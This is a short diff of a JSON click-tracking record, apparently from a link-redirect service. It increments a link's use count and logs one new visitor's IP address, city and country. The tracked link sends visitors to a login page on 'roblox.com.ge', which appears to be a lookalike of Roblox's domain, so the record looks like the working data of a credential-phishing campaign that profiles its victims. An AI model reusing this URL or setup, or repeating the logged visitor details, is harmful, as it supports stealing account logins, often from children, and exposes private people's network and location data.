@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1624,
+    "useCount": 1625,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13160,6 +13160,14 @@
         "city": "Helsinki",
         "flag": "🇫🇮",
         "countryCode": "FI"
+      },
+      {
+        "timestamp": 1777538535088,
+        "ip": "113.210.90.55",
+        "country": "Malaysia",
+        "city": "Kota Kinabalu",
+        "flag": "🇲🇾",
+        "countryCode": "MY"
       }
     ]
   },
